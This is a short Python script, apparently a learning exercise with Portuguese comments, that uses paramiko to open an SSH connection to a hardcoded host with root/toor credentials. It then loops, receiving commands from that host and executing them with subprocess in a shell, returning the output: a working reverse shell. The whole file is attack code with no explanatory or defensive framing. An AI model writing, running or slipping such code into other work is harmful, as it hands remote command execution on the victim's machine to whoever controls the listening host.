import getpass
import subprocess
import paramiko


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.load_host_keys(r'rsa_reverso.key')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
    client.close()
    return
def main():
    ##ip = input("Digite o IP do host: ")
    ##port = int(input("Digite a porta: "))
    ##user = input("Digite o usuário: ")
    ##passwd = getpass.getpass("Digite a senha: ")
    ##command = input("Digite o comando: ")
    ip, port, user, passwd, command = '192.168.100.38', 5004, 'root', 'toor', 'ClientConnected'
    ssh_command(ip, port, user, passwd, command)


if __name__ == '__main__':
    main()




